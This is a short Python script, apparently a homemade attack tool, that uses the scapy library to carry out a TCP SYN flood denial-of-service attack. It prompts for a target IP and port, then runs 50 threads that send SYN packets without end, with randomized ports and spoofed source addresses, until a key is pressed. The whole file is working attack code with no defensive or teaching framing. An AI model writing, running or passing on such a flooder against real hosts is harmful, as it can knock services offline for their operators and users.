# import scapy to create manual SYN packets
from scapy.all import *
from scapy.layers.inet import TCP, IP # apparentoy needed to avoid errors with TCP/IP layers
# import threading to run multiple threads
import threading
# import random to randomize source ports and IPs
import random
# import keyboard to cancel the script with a key press
import keyboard


### Script starts here ###

# get input from the user for target IP and port
target_ip = input("Enter target IP address: ")
target_port = int(input("Enter target port number: "))

# define a flag to control the running state of the script
is_running = True

# create the flodder function
def syn_flooder():
    while is_running:
        # randomize source port and IP
        src_port = random.randint(1024, 65535)
        src_ip = f"192.168.1.{random.randint(100, 200)}"

        # create IP and TCP layers for SYN packet
        ip = IP(src=src_ip, dst=target_ip)
        syn = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 5000))

        # send the SYN packet
        send(ip/syn, verbose=0)

# create listener function to stop the attack
def kill_switch_listener():
    global is_running
    print("[*] Press 'C' to stop the attack.")
    keyboard.wait('c')  # Blocks until C is pressed
    is_running = False
    print("[!] Kill key pressed. Shutting down...")

# start the kill switch on its own thread
threading.Thread(target=kill_switch_listener, daemon=True).start()

# boot the SYN flooder threads
threads = []
for _ in range(50):  # Adjust thread count as needed
    t = threading.Thread(target=syn_flooder)
    t.start()
    threads.append(t)

# wait for all threads to finish
for t in threads:
    t.join()